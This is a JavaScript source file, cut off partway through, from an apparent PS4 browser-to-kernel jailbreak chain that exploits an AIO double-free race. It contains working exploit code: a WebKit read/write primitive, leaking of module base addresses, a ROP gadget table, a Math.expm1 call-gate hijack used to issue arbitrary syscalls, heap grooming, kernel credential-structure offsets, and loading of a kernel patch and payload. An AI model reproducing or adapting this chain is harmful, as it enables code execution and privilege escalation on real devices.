import { establishPrimitive } from "./core.js";
import { installWindowP, pairStatus } from "./mem.js";
import { int64 } from "./int64.js";
import { createContext, layoutContext, forceYield, put } from "./module/rop.js";
import { validateGadgets, discoverStubs } from "./module/gadgets.js";
import { loadPayload, kpatchPath, loadBinary, kpatchJmpSites } from "./module/assets.js";
import { checkJailbroken } from "./check-jailbroken.js";
import { runChain, mark, state, check, trace, hx, checkCounts, hexBytes, makePrimitiveProgress } from "./module/log.js";
import { makeRpc } from "./workers.js";
import { COMMON, LAPSE_SYS as SYS } from "./module/constants.js";
import { isKernelPtr, isKernelPtrAligned, isPtrish, isPlausibleBase, sameI64 } from "./module/addr.js";
import { bufferAddress, syscallResult } from "./module/syscall.js";
import { resolvePthreadCreate as resolvePthreadCreateShared, readSysentEntry, writeSysentEntry, armSysentEntry, readByte, isGateableJumpByte, mapRwxAtFixedAddress, KEXEC_MAP_LO, KEXEC_MAP_HI, mapAnonymousRwx, launchThread } from "./post-exploit.js";

const { JSVALUE_UNDEFINED } = COMMON;

/*
 * lapse.js drives the vfs_aio2.c _aio_multi_delete double-free (see
 * kernel_bug/lapse_bug.c), NOT netcontrol. The UAF is won by a refcount
 * race on the freed rthdr chunk, driven from the RPC worker pool exactly
 * as netctrl's triple-free is.
 *
 * THREADS. The race runs on worker.js instances. Each worker is a separate
 * JS realm that builds its OWN copy of the userland primitive (init),
 * transfers a marker buffer out so we can find its objects from here, and
 * arms its own Math.expm1 call gate (armPivot). fire() then runs a ROP
 * chain on that thread. The pool is not optional -- it is what gives the
 * race its concurrency, and its allocation pattern is part of the heap
 * shape the primitive's groom depends on *
 * STRUCTURE. This file mirrors netctrl.js: every stage is a MODULE-SCOPE
 * function, the values the stages share are module-scope `let`s declared in
 * one block below, and small per-stage helper builders (makeAioHelpers,
 * makeLeakHelpers, makeKarwHelpers) are invoked from stagePrimitive before
 * the stages that use them run. The earlier draft nested every stage inside
 * runOriginal; that worked but it diverged from the chain that is verified
 * working, and the divergence was where the port's bugs hid. Same shape as
 * netctrl means the same tools (report-var-owners, the free-var check) read
 * this file the same way they read netctrl.
 */

const params = new URLSearchParams(location.search);

/* =====================================================================
 * CONSTANTS -- every fixed value for this chain lives here, and only here.
 * ===================================================================== */

/* ---- geometry / pool sizes ---------------------------------------- */
const NUM_WORKERS = 2;          // blocked AIO workers held in stage 0
/* The race needs exactly ONE RPC worker: raceOne() only ever uses
   raceWorkers[0]. The reference (lapse-cssfontface.js:120) spawns a single
   `race_worker`; WORKER_NUM=2 there is the count of BLOCKED AIO entries,
   not JS workers. This port defaulted to 8, but 7 were dead weight -- and
   each one spawns a full second copy of the core.js primitive, brought up
   while the main thread is already pinned to MAIN_CORE at RT priority.
   That starved the renderer and hung the page right after alt-sockets-open,
   before the first `ping` could answer. One is all the race uses. */
const NUM_RACE_WORKERS = params.has("workers")
    ? parseInt(params.get("workers"), 10) : 1;
const NUM_GROOMS = 0x200;       // AIO queue-groom batch
const NUM_SDS = 64;             // main rthdr socket pool
const NUM_SDS_ALT = 48;         // stage-4 reclaim socket pool
const NUM_RACES = 100;          // race attempts before giving up
const NUM_ALIAS = 100;          // marker/reclaim hunt loops
const AIO_REQ_SIZE = 0x28;      // sizeof(SceKernelAioRWRequest)

/* ---- AIO command + state words ------------------------------------ */
const AIO_CMD_READ = 1;
const AIO_CMD_WRITE = 2;
const AIO_CMD_FLAG_MULTI = 0x1000;
const AIO_CMD_MULTI_READ = 0x1001;      // READ | FLAG_MULTI
const AIO_STATE_COMPLETE = 3;
const AIO_STATE_ABORTED = 4;
const MAX_AIO_IDS = 0x80;               // per aio_multi_* batch
const NUM_CLOBBERS = 8;                 // rthdr->AIO clobber attempts

/* ---- sockets ------------------------------------------------------- */
const AF_UNIX = 1, AF_INET = 2, AF_INET6 = 28;
const SOCK_STREAM = 1, SOCK_DGRAM = 2;
const IPPROTO_TCP = 6, IPPROTO_UDP = 17;
const SO_REUSEADDR = 4, SO_LINGER = 0x80;

/* ---- IPv6 option numbers (the ARW window) -------------------------- */
const IPV6_PKTINFO = 46;
const IPV6_NEXTHOP = 48;
const IPV6_TCLASS = 61;
const IPV6_2292PKTOPTIONS = 25;

/* ---- PS4 kernel struct offsets (PS4 column, NOT PS5) --------------- */
const IP6PO_RTHDR = 0x68;
const IP6PO_TCLASS = 0xb0;
const SO_PCB = 0x18;
const INPCB_PKTOPTS = 0x118;
const SIZEOF_OFILES = 0x8;
const PROC_PID = 0xb0;
const PROC_FD = 0x48;
const FILEDESC_OFILES = 0x0;    // PS4 is 0x0, not the PS5 value
const PAGE_SIZE_ = 0x4000;

/* ---- cred walk (kProc -> prison0 / rootvnode) ---------------------- */
const P_LIST_NEXT = 0x00, P_UCRED = 0x40, P_FD = 0x48;
const CR_UID = 0x04, CR_RUID = 0x08, CR_SVUID = 0x0c;
const CR_NGROUPS = 0x10, CR_RGID = 0x14;
const CR_PRISON = 0x30, CR_SCECAPS1 = 0x60, CR_SCECAPS0 = 0x68;
const FD_RDIR = 0x10, FD_JDIR = 0x18;

/* ---- evf leak ------------------------------------------------------ */
const EVF_FLAG_TAG = 0xf00;
const EVF_FLAG_FINAL = 0xff00;
const LEAK_LEN = 16;            // buflen = 0x80 * LEAK_LEN
const NUM_LEAKS = 32;
const NUM_HANDLES = (function () {
    const q = params.has("handles")
        ? parseInt(params.get("handles"), 10) : 0x100;
    return (q > 0 && q <= 0x4000) ? q : 0x100;
})();

/* ---- thread spawn / probe ------------------------------------------ */
const THR_NEW_ARGS_SIZE = 0x80;
/* sizeof(struct tcp_info) on the PS4 is 0xec (reference: size_tcp_info).
   The port had 0x100, a length the struct does not have. */
const SIZE_TCP_INFO = 0xec;
const RTHDR_MIN = 8;            // minimum bytes a valid copyout must give
/* ---- thread priority / TCP probe ----------------------------------- */
const PRI_REALTIME = 2, MAIN_RTPRIO = 0x100;
const TCPS_ESTABLISHED = 4;     // TCP_INFO.tcps_state when the peer is up
/* TCP_INFO is the IPPROTO_TCP optname 32, NOT 4 (reference lapse-vue.js:79).
   Passing 4 to getsockopt(IPPROTO_TCP, 4) does not return tcps_state, so the
   race-win predicate below read garbage. */
const TCP_INFO = 32;
const SCE_KERNEL_ERROR_ESRCH = 0x80020003;

/* RTP_LOOKUP was COMMON.RTP_LOOKUP in the earlier draft, but COMMON has no
   such member -- see module/constants.js. It only "worked" because
   undefined >>> 0 === 0, and RTP_LOOKUP happens to be 0. Declare it here
   explicitly, exactly as netctrl does (netctrl.js:67), so the value is a
   real constant and not an accident of coercion. */
const RTP_LOOKUP = 0, RTP_SET = 1;

/* ---- misc ---------------------------------------------------------- */
const R2_ON = params.get("r2") !== "0";

/* lapse's own core, from lapse-vue.js (`var MAIN_CORE = 4`). NOT
   COMMON.MAIN_CORE -- netctrl pins to 7 and both chains share that
   constant, but the AIO race's pin must match the reference: the spawned
   thr_new thread and the main thread must land on the SAME core for the
   suspend/resume window to hold. */
const MAIN_CORE = params.has("core")
    ? parseInt(params.get("core"), 10) : 4;

/* ---- helpers -------------------------------------------------------
 * offsetsFor(): main.js publishes window.offsetsFor from the PS4 table in
 * src/offset.js before it calls run(). Resolve lazily so the chain reports a
 * clear error instead of a TypeError if it is ever run standalone.
 */
function offsetsFor(ua) {
    if (typeof window === "undefined" || typeof window.offsetsFor !== "function")
        throw new Error("offsetsFor is not installed -- main.js must run before "
            + "the exploit chain (it publishes window.offsetsFor from the PS4 "
            + "table in src/offset.js)");
    return window.offsetsFor(ua);
}

// Build an IPV6_RTHDR0 option into a DataView; returns the copyout length.
function buildRthdr0(dv, size) {
    const n = Math.floor((size - COMMON.IP6_RTHDR0_SIZE) / COMMON.IN6_ADDR_SIZE);
    new Uint8Array(dv.buffer).fill(0);
    dv.setUint8(0, 0); dv.setUint8(1, (n * 2) & 0xff);
    dv.setUint8(2, 0); dv.setUint8(3, n & 0xff);
    return COMMON.IP6_RTHDR0_SIZE + COMMON.IN6_ADDR_SIZE * n;
}

function toI64(v) {
    if (v === null || v === undefined) return new int64(0, 0);
    if (typeof v === "number") return new int64(v >>> 0, v < 0 ? -1 : 0);
    return v;
}

/* =====================================================================
 * SHARED STATE -- set up by one stage, read by the next. Same shape as
 * netctrl.js: everything a stage needs from another stage is a module-level
 * binding declared here, so there are no hidden closure captures and
 * tools/report-var-owners.js can see every cross-stage use.
 * ===================================================================== */

// Kept alive so the GC cannot move buffers whose addresses went to the kernel.
const keepAlive = [];
const workers = [];
let payloadRan = false, allDone = false;

// Values the stages share. Set up by stagePrimitive, used by everything after.
let p = null;                       // the userland primitive (mem.js)
let off = null, key = null;         // firmware offsets + the UA key they came from
let G = null, M = null;             // gadget table, ROP context
let sc = null, callAddr = null;     // call gate + "call syscall N through it"
let stubAddr = null, errorFn = null;
let webkitBase = null, libkernelBase = null, pid = 0;
let bufAddr = null;
let argGadget = null;
let mainMf = null, mainOrig = null, mainArmed = false;
let kpatch = null, payload = null;

// Tunables the stages read, set at the top of stagePrimitive from ?attempts.
let NUM_ATTEMPT = 6;

// Why stagePrimitive returned false, so runOriginal can report the truth
// instead of always claiming "unsupported firmware". netctrl distinguishes
// "console is already jailbroken" from a genuine primitive failure.
let primitiveFail = null;
// Set when the chain stops before stage 2 -- nothing was set up, so teardown
// must not pretend otherwise.
let stoppedEarly = false;

// Scratch buffers whose kernel addresses are handed to syscalls.
let scratch = null, argAddr = 0, argDv = null;
let lenAddr = 0, lenDv = null;
let sprayAddr = 0, sprayDv = null, sprayLen = 0;
let leakAddr = 0, leakDv = null, leakU8 = null;
let shortReads = 0;

// Stage 2 (race) state.
let pipeBuf = null;
let blockFd = -1, unblockFd = -1, blockId = -1;
let sds = [], sdsAlt = [], groomIds = [], groomIdsAddr = null, triplets = null;
let prevCore = -1, prevRtprio = 0;
let raceWorkers = [];

// Stage 3 (leak) state.
let kernelAddr = null, kbufAddr = null, reqs1Addr = null, aioInfoAddr = null;
const leakOffsets = {};

// Stage 4 (ARW) state.
let kernelRead8 = null, kernelWrite8 = null;
let kernelReadBuffer = null, kernelWriteBuffer = null;
let kernelReadCString = null, kernelCopyout = null;
let kernelArwCurproc = null, kernelArwBase = null;
let pipeReadFd = -1, pipeWriteFd = -1, pipeAddr = null;
let pipeMapBuf = null, readMem = null;
let masterSock = -1, workerSock = -1, victimSock = -1, reclaimSock = -1;
let workerPktopts = null, masterPktopts = null;
let curprocOfiles = null;

// Stage 5 (credentials / patch / payload) state.
let curproc = null, kProc = null, ucred = null, procFd = null;
let jailbroken = false, kpatched = false;

// Helpers filled in by the per-stage builder functions.
let fireW = null;
/* =====================================================================
 * ENTRY POINT -- main.js calls run().
 * ===================================================================== */

export function run(options) {
    return runChain({
        ...options,
        postPrefix: "PS4-LAPSE",
        postRawDetail: true,
        badRe: /FAIL|ERROR|THREW|REBOOT|MISS|LOST|POISON|TIMEOUT|MISMATCH|ABORTED/i,
        warnRe: /WARN|SKIP|REFUSED|COMMITTED|DIRTY/i,
        okRe: /\bOK\b|PASS|ACHIEVED|RUNNING|ARMED/i,
    }, runOriginal);
}

/* =====================================================================
 * SHARED BUFFER + SYSCALL HELPERS
 *
 * alloc() takes a USERLAND ArrayBuffer and records its kernel address via
 * bufAddr. bufAddr is null until stagePrimitive installs the primitive, so
 * alloc() must never be reachable before then -- every stage that calls it
 * runs after stagePrimitive returned true. The one exception is the cleanup
 * path, which is guarded by stoppedEarly (see stageTeardown).
 * ===================================================================== */

function alloc(n) {
    const ab = new ArrayBuffer(n);
    keepAlive.push(ab);
    return { addr: bufAddr(ab), dv: new DataView(ab), u8: new Uint8Array(ab) };
}

// aio_submit_cmd(cmd, reqs, num_reqs, priority, ids)
function submitCmd(cmd, reqs, n, prio, ids) {
    return sc(SYS.aio_submit_cmd, cmd, reqs.addr, n, prio, ids.addr).i32;
}
function multiCancel(ids, n, errs) {
    return sc(SYS.aio_multi_cancel, ids.addr, n, errs.addr).i32;
}
function multiPoll(ids, n, errs) {
    return sc(SYS.aio_multi_poll, ids.addr, n, errs.addr).i32;
}
function multiDelete(ids, n, errs) {
    return sc(SYS.aio_multi_delete, ids.addr, n, errs.addr).i32;
}

function makeReqs(n) {
    const reqs = alloc(AIO_REQ_SIZE * n);
    for (let i = 0; i < n; ++i)
        reqs.dv.setUint32(i * AIO_REQ_SIZE + 0x20, 0xffff, true);
    return reqs;
}

/* ids is always a { addr } alloc slice; the offset slice below is the
   same shape so submitCmd/multiCancel can read .addr uniformly. */
function idSlice(ids, off) {
    return { addr: ids.addr.add32(off) };
}

function sprayAio(loops, reqs, n, ids, multi, cmd) {
    const step = 4 * (multi ? n : 1);
    const finalCmd = cmd | (multi ? AIO_CMD_FLAG_MULTI : 0);
    for (let i = 0; i < loops; ++i)
        submitCmd(finalCmd, reqs, n, 3, idSlice(ids, i * step));
}

function cancelAios(ids, n) {
    const len = 0x80;
    const batches = Math.floor(n / len);
    const errs = alloc(4 * len);
    for (let i = 0; i < batches; ++i)
        multiCancel(idSlice(ids, i * 4 * len), len, errs);
    const rem = n % len;
    if (rem > 0)
        multiCancel(idSlice(ids, batches * 4 * len), rem, errs);
}

/* cancel then poll then delete a run of aio ids -- the reference's
   free_aios, used to release the groom batch once it is done. */
function freeAios(ids, n, doCancel) {
    const len = 0x80;
    const batches = Math.floor(n / len);
    const errs = alloc(4 * len);
    for (let i = 0; i < batches; ++i) {
        const slice = idSlice(ids, i * 4 * len);
        if (doCancel) multiCancel(slice, len, errs);
        multiPoll(slice, len, errs);
        multiDelete(slice, len, errs);
    }
    const rem = n % len;
    if (rem > 0) {
        const slice = idSlice(ids, batches * 4 * len);
        if (doCancel) multiCancel(slice, rem, errs);
        multiPoll(slice, rem, errs);
        multiDelete(slice, rem, errs);
    }
}

function newUdp6() {
    const sd = sc(SYS.socket, AF_INET6, SOCK_DGRAM, IPPROTO_UDP).i32;
    if (sd === -1) throw new Error("socket(AF_INET6, DGRAM) failed");
    return sd;
}
function newTcp() {
    const sd = sc(SYS.socket, AF_INET, SOCK_STREAM, 0).i32;
    if (sd === -1) throw new Error("socket(AF_INET, STREAM) failed");
    return sd;
}

// Build a compact IPV6_RTHDR option into an alloc'd buffer; returns length.
function buildRthdr(buf, size) {
    const len = ((size >> 3) - 1) & ~1;
    buf.u8[0] = 0;
    buf.u8[1] = len & 0xff;
    buf.u8[2] = 0;
    buf.u8[3] = (len >> 1) & 0xff;
    return ((len + 1) << 3);
}
function setRthdr(sd, buf, len) {
    return sc(SYS.setsockopt, sd, COMMON.IPPROTO_IPV6,
        COMMON.IPV6_RTHDR, buf.addr, len).i32;
}
function getRthdr(sd, buf, maxLen) {
    const lp = alloc(4);
    lp.dv.setUint32(0, maxLen, true);
    const rv = sc(SYS.getsockopt, sd, COMMON.IPPROTO_IPV6,
        COMMON.IPV6_RTHDR, buf.addr, lp.addr).i32;
    return rv === -1 ? -1 : lp.dv.getUint32(0, true);
}
function freeRthdr(sd) {
    sc(SYS.setsockopt, sd, COMMON.IPPROTO_IPV6,
        COMMON.IPV6_RTHDR, 0, 0);
}

/* Short-read gated read of the master rthdr. Fills 0xee first so a short
   copyout cannot be mistaken for fresh data, and the return is checked at
   EVERY call site. `need` is the highest byte offset the caller parses;
   without it a half-filled buffer passes. Lives at module scope because
   both the leak stage and the ARW stage read through the master rthdr. */
function readRthdr(masterSd, size, need) {
    if (R2_ON) leakU8.fill(0xee, 0, size);
    lenDv.setUint32(0, size, true);
    const rv = sc(SYS.getsockopt, masterSd, COMMON.IPPROTO_IPV6,
        COMMON.IPV6_RTHDR, leakAddr, lenAddr).i32;
    if (rv !== 0) { shortReads++; return -1; }
    const got = lenDv.getUint32(0, true);
    const min = (need === undefined) ? RTHDR_MIN : need;
    if (R2_ON && got < min) { shortReads++; return -1; }
    return got;
}

function writeRthdr(sd, buf, len) {
    return sc(SYS.setsockopt, sd, COMMON.IPPROTO_IPV6,
        COMMON.IPV6_RTHDR, buf.addr !== undefined ? buf.addr : buf, len).i32;
}

/* Run a syscall on a worker's own thread: lay the chain out in that
   worker's ROP context, then tell it to fire -- worker.js pivots into the
   chain through its own armed expm1 gate. Same shape as netctrl's.

   This is the browser equivalent of the reference's spawn_thread: the
   worker's realm already has its own armed gate, so a fire() IS "run
   this ROP chain on another thread". */
function fireWorker(w, num, args, timeoutMs) {
    layoutContext(w.ctx, off, G, argGadget, JSVALUE_UNDEFINED,
        stubAddr.get(num), args);
    return w.rpc("fire", timeoutMs === undefined ? 15000 : timeoutMs,
        w.ctx.S.low, w.ctx.S.hi);
}

/* Join a batch of worker fires, giving up after ms and reporting how
   many were still parked -- a parked worker is the healthy state during
   the race, so this is a timeout for progress, not for failure. */
async function boundedJoin(tasks, ms, label) {
    if (!tasks || !tasks.length) return 0;
    let settled = 0;
    const all = Promise.all(tasks.map(function (t) {
        return Promise.resolve(t)
            .then(function () { settled++; }, function () { settled++; });
    }));
    let timer = null;
    const timeout = new Promise(function (r) { timer = setTimeout(r, ms); });
    await Promise.race([all, timeout]);
    if (timer !== null) clearTimeout(timer);
    const outstanding = tasks.length - settled;
    if (outstanding > 0)
        mark("JOIN-TIMEOUT", label + " " + outstanding + "/"
            + tasks.length + " parked after " + ms + " ms");
    return outstanding;
}

/* Join budget for the worker fires. Parked workers are the healthy state
   during the race, so this only bounds how long we wait for progress. */
const JOIN_MS = params.has("joinms")
    ? parseInt(params.get("joinms"), 10) : 5000;

/* Heap-sweep budget after the primitive promotes, same knobs as netctrl
   (netctrl.js:163-165). These were stagePrimitive locals in the earlier
   draft; on the module-scope refactor they must be declared here or the
   sweep branch throws "Can't find variable: SWEEP_CYCLES". */
const SWEEP_CYCLES = params.has("sweep") ? parseInt(params.get("sweep"), 10) : 6;
const SWEEP_MS = params.has("sweepms") ? parseInt(params.get("sweepms"), 10) : 60;
const SWEEP_MB = params.has("sweepmb") ? parseInt(params.get("sweepmb"), 10) : 8;

/* =====================================================================
 * STAGE 1 -- firmware, blobs, primitive, bases, ROP gate.
 *
 * ORDER MATTERS AND IS NETCTRL'S. The firmware offsets are resolved and the
 * kpatch/payload BLOBS are fetched FIRST, before the primitive is ever
 * touched. The earlier draft ran the primitive first and resolved offsets
 * afterwards, which turned a plain "this firmware has no offset table" into
 * a failure that surfaced as a primitive error -- and, worse, let the chain
 * spend a whole primitive attempt (heap groom included) before finding out.
 * netctrl checks the cheap, deterministic things first; this does too now.
 * ===================================================================== */
async function stagePrimitive(options) {
    NUM_ATTEMPT = params.has("attempts")
        ? Math.max(1, Math.min(100, parseInt(params.get("attempts"), 10) || 6))
        : 6;

    const resolved = offsetsFor(navigator.userAgent);
    key = resolved.key;
    off = resolved.off;
    mark("FW", (key || "(not a PS4 UA)") + "  " + (off && off.fw_status || "none"));
    if (!off) {
        state("no offsets for this firmware", "bad");
        primitiveFail = "unsupported-firmware";
        return false;
    }

    const kpatchName = kpatchPath(key, off);
    try {
        kpatch = await loadBinary(kpatchName);
    } catch (e) { mark("KPATCH-FETCH-THREW", e.message); }
    mark("KPATCH-BLOB", kpatch
        ? "blob=" + kpatchName + " bytes=" + kpatch.length
        + " sites=" + kpatchJmpSites(kpatch).length
        : "blob=" + kpatchName + " MISSING");
    try {
        payload = await loadPayload(options.payload);
    } catch (e) { mark("PAYLOAD-FETCH-THREW", e.message); }
    mark("PAYLOAD-BLOB", payload
        ? "bytes=" + payload.length + " entry="
        + (payload[0] === 0xe9 ? "e9-jmp-rel32" : "NOT-e9")
        : "MISSING");

    state("running the primitive...", "warn");
    await new Promise(r => setTimeout(r, 0));

    const progress = makePrimitiveProgress(NUM_ATTEMPT);
    const carrier = await establishPrimitive({
        maxAttempts: NUM_ATTEMPT,
        onEvent: progress.onEvent
    });
    progress.done("ok");

    const PAIR_ON = params.get("pair") === "1";
    installWindowP(carrier, { promote: PAIR_ON, onEvent: progress.onEvent });
    if (!window.p) throw new Error("window.p was not installed");
    p = window.p;
    mark("PAIR-STATUS", "state=" + pairStatus.state
        + " promoted=" + pairStatus.promoted
        + " stage=" + pairStatus.stage
        + (pairStatus.failedAt ? " failedAt=" + pairStatus.failedAt : "")
        + (pairStatus.error ? " error=" + pairStatus.error : ""));

    /* Settle the heap after promotion, exactly as netctrl does. Without
       this the post-promotion allocation pattern is still the one the
       primitive left behind, and downstream sprays (the AIO groom, the
       evf/pktopts reclaims) land differently. netctrl has run this on
       every successful boot. */
    if (pairStatus.promoted && SWEEP_CYCLES > 0) {
        state("sweeping...", "warn");
        const t0 = Date.now();
        let worst = 0;
        for (let i = 0; i < SWEEP_CYCLES; ++i) {
            const c0 = Date.now();
            let junk = [];
            for (let k = 0; k < SWEEP_MB; ++k)
                junk.push(new ArrayBuffer(0x100000));
            junk.length = 0; junk = null;
            await new Promise(r => setTimeout(r, SWEEP_MS));
            const dt = Date.now() - c0;
            if (dt > worst) worst = dt;
        }
        mark("SWEEP", "cycles=" + SWEEP_CYCLES + " mb=" + SWEEP_MB
            + " floor_ms=" + SWEEP_MS + " worst_cycle_ms=" + worst
            + " total_ms=" + (Date.now() - t0));
    } else {
        mark("SWEEP-SKIPPED", "promoted=" + pairStatus.promoted
            + " cycles=" + SWEEP_CYCLES);
    }
    mark("PRIMITIVE-OK", "");

    const cell = p.leakval(Math.expm1);
    const nativeFn = p.read8(p.read8(cell.add32(0x18))
        .add32(off.wk_JSFunction_m_function));
    webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
    errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
    libkernelBase = errorFn.sub32(off.k__error);
    mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);

    /* NO libc derivation here. netctrl derives exactly two bases and
       goes straight to the gadget table; this chain did the same until
       an earlier draft added a libc lookup for the thr_new/longjmp
       trampoline. That trampoline is gone (the race runs on the worker
       pool), so the extra WebKit read -- and the second check it fed --
       is removed. Fewer reads between the primitive and the ROP gate is
       strictly safer, and it matches the chain that works. */
    const aligned = isPlausibleBase;
    if (!check("module-bases-0x4000-aligned",
        aligned(webkitBase) && aligned(libkernelBase), "")) return false;

    const GAD = [
        ["POP_RDI_RET", off.wk_POP_RDI_RET, [0x5f, 0xc3]],
        ["POP_RSI_RET", off.wk_POP_RSI_RET, [0x5e, 0xc3]],
        ["POP_RDX_RET", off.wk_POP_RDX_RET, [0x5a, 0xc3]],
        ["POP_RCX_RET", off.wk_POP_RCX_RET, [0x59, 0xc3]],
        ["POP_R8_RET", off.wk_POP_R8_RET, [null, 0x58, 0xc3]],
        ["POP_R9_RET", off.wk_POP_R9_RET, [null, 0x59, 0xc3]],
        ["POP_RAX_RET", off.wk_POP_RAX_RET, [0x58, 0xc3]],
        ["LEAVE_RET", off.wk_LEAVE_RET, [0xc9, 0xc3]],
        ["MOV_RDI_RAX_RET", off.wk_MOV_QWORD_PTR_RDI_RAX_RET, [0x48, 0x89, 0x07, 0xc3]],
        ["G0", off.wk_MOV_RDI_RSI_30_CALL, [0x48, 0x8b, 0x7e, 0x30], true],
        ["G1", off.wk_POP_RAX_MOV_RAX_JMP_18, [0x58, 0x48, 0x8b, 0x07], true],
        ["G2", off.wk_PUSH_RBP_MOV_RBP_RSP_10, [0x55, 0x48, 0x89, 0xe5], true],
        ["G3", off.wk_MOV_RDI_RAX_8_CALL_20, [0x48, 0x8b, 0x78, 0x08], true],
        ["G4", off.wk_MOV_RDX_RAX_18_CALL_10, [0x48, 0x8b, 0x50, off.pivot_view_sp], true],
        ["G5", off.wk_PUSH_RDX_POP_RSP_RET, [0x52, 0x5c, 0xc3], true],
    ];
    const gv = validateGadgets(p, webkitBase, GAD, hexBytes, mark);
    G = gv.gadgets;
    if (!check("gadget-table-fits-module", !gv.fatal,
        gv.gated + "/" + gv.total)) return false;
    argGadget = [G.POP_RDI_RET, G.POP_RSI_RET, G.POP_RDX_RET,
    G.POP_RCX_RET, G.POP_R8_RET, G.POP_R9_RET];

    const disc = discoverStubs(p, libkernelBase, off, SYS);
    stubAddr = disc.stubAddr;
    mark("STUBS", "seeded=" + disc.seeded + " scanned=" + disc.scanned);

    /* THE PORT HAZARD. lapse-vue.js is a USERLAND APP linked against
       libkernel.sprx. This chain runs inside the INTERNET BROWSER,
       linked against libkernel_web.sprx -- a DIFFERENT, REDUCED binary
       with its own stub page. LAPSE_SYS was transcribed from the vue
       reference's syscalls.map, so it carries numbers whose stubs live
       in the FULL libkernel and may simply NOT EXIST in the web image
       (getpeername, thr_new, thr_exit, thr_suspend_ucontext, ...).

       Gating the primitive on disc.missing.length === 0 therefore
       aborts the WHOLE chain the moment ONE unused, vue-only syscall
       has no stub -- which is exactly the "primitive throws a tantrum"
       symptom. netctrl never sees it because its table only names
       syscalls that exist in libkernel_web.

       So: only a syscall lapse ACTUALLY CALLS is fatal when its stub is
       missing. Everything else is reported and ignored. */
    const REQUIRED_STUBS = [
        "read", "write", "close", "getpid", "getuid", "geteuid",
        "setuid", "socket", "connect", "bind", "getsockname",
        "listen", "accept", "setsockopt", "getsockopt", "socketpair",
        "sched_yield", "rtprio_thread", "cpuset_getaffinity",
        "cpuset_setaffinity", "evf_create", "evf_delete", "evf_set",
        "evf_clear", "aio_multi_delete", "aio_multi_wait",
        "aio_multi_poll", "aio_multi_cancel", "aio_submit_cmd",
        "pipe", "mmap", "jitshm_create", "kexec", "is_in_sandbox",
    ];
    const requiredSet = new Set(REQUIRED_STUBS);
    const missingRequired = disc.missing.filter(
        name => requiredSet.has(name.replace(/\(wrapper\)$/, "")));
    const missingTolerated = disc.missing.filter(
        name => !requiredSet.has(name.replace(/\(wrapper\)$/, "")));
    if (missingTolerated.length)
        mark("STUBS-ABSENT-TOLERATED", "in libkernel_web but named by the "
            + "vue table (unused here): " + missingTolerated.join(","));
    if (!check("syscall-page-needs-stub", missingRequired.length === 0,
        missingRequired.length ? "MISSING: " + missingRequired.join(",")
            : disc.missing.length + " tolerated")) return false;

    bufAddr = ab => bufferAddress(p, off, ab);
    M = createContext({ p, offsets: off, gadgets: G, keepAlive });
    mainMf = p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function);
    mainOrig = p.read8(mainMf);
    const pivotObj = {};
    keepAlive.push(pivotObj);
    const pivotCell = p.leakval(pivotObj);
    p.write8(mainMf, G.G0);
    mainArmed = true;
    callAddr = function (target, args) {
        layoutContext(M, off, G, argGadget, JSVALUE_UNDEFINED, target, args);
        const saved = p.read8(pivotCell);
        p.write8(pivotCell, M.S);
        Math.expm1(pivotObj);
        p.write8(pivotCell, saved);
        return syscallResult(M.frameDv);
    };
    sc = (num, ...a) => callAddr(stubAddr.get(num), a);
    pid = sc(SYS.getpid).i32;
    const uid = sc(SYS.getuid).i32;
    check("chain-reaches-kernel", pid > 0,
        "pid=" + pid + " uid=" + uid);
    const jb = checkJailbroken({ sc, sys: SYS, mark, state });
    if (jb.alreadyJailbroken) {
        primitiveFail = "already-jailbroken";
        return false;
    }

    /* The race helpers depend only on sc/stubAddr/argGadget, all live now.
       Install them before any stage that uses them runs. */
    fireW = fireWorker;
    return true;
}

/* =====================================================================
 * STAGE 2 -- the AIO double-free race.
 *
 * Brings up the worker pool, grooms the aio zone, submits the multi
 * request against a TCP peer, and drives the refcount race on the freed
 * rthdr chunk. When the chunk is reclaimed with refcnt 1 the second
 * free hits the same queue_ent[] (lapse_bug.c's free_queue_entry path)
 * and the two rthdr chunks alias.
 * ===================================================================== */
/* Bring up the RPC worker pool, then pin main + workers.

   THIS RUNS FIRST IN stageRace, before the socketpair, the blocked AIO
   workers, the groom or any socket. That is netctrl's ORDER and it is the
   whole point: netctrl's stageWorkers spawns and arms every worker while the
   process is otherwise clean, and only THEN does stageThreadAttrs pin. Here
   the pool used to be built at the END of stageRace -- after 2 AIO workers
   were already parked in read() on the socketpair, after the 512-entry
   groom and after 112 sockets were open. The worker realm then never got
   scheduled to answer the first rpc("init") and the page froze at
   "race0 ping ok". Same code, same worker.js; only the neighbours differed.

   Each worker is a SECOND copy of the WebKit primitive in its own realm:
   init() builds master/victim/leakObj and transfers the marker buffer out,
   setup()/armPivot() wire and arm its own Math.expm1 call gate, and fire()
   runs a ROP chain on that thread. */
async function stageWorkers() {
    const TOTAL_WORKERS = NUM_RACE_WORKERS;
    state("bringing up " + TOTAL_WORKERS + " workers...", "warn");
    /* Nothing is pinned yet, but the worker realm still needs the scheduler
       to run its module + answer the first ping; yield once so the spawn is
       not competing with a synchronous burst on the main thread. */
    await forceYield();
    for (let i = 0; i < TOTAL_WORKERS; ++i) {
        const name = "race" + i;
        const w = { name: name, armed: false, wired: false };
        workers.push(w);
        w.worker = new Worker("src/worker.js");
        w.rpc = makeRpc(w.worker, name, undefined,
            (n, msg) => mark("WORKER-ONERROR", `${n} ${msg}`));
        if ((await w.rpc("ping", 15000)) !== "pong")
            throw new Error(name + " did not answer ping");
        trace("WORKER-STEP", name + " ping ok");
        const sLo = (0x10100000 | i) >>> 0, sHi = (0xc0de0000 | i) >>> 0;
        trace("WORKER-STEP", name + " init -> sending");
        const arr = await w.rpc("init", 15000, sLo, sHi);
        trace("WORKER-STEP", name + " init returned");
        keepAlive.push(arr);
        const D = bufAddr(arr.buffer);
        if ((p.read4(D) >>> 0) !== sLo)
            throw new Error(name + ": transfer did not preserve the store");
        trace("WORKER-STEP", name + " store ok");
        /* Every p.read8 below aims the carrier window at an address and
           dereferences it. isPtrish() is only a RANGE test, so a stale or
           half-transferred pointer passes it and the next read dereferences
           unmapped memory -- that kills the WebProcess with no JS exception. */
        const storage = p.read8(D.add32(0x10));
        if (!isPtrish(storage))
            throw new Error(name + ": storage not ptrish");
        const mc = p.read8(storage.add32(8));
        if (!isPtrish(mc))
            throw new Error(name + ": mc not ptrish");
        const bf = p.read8(mc.add32(8));
        if (!isPtrish(bf))
            throw new Error(name + ": bf not ptrish");
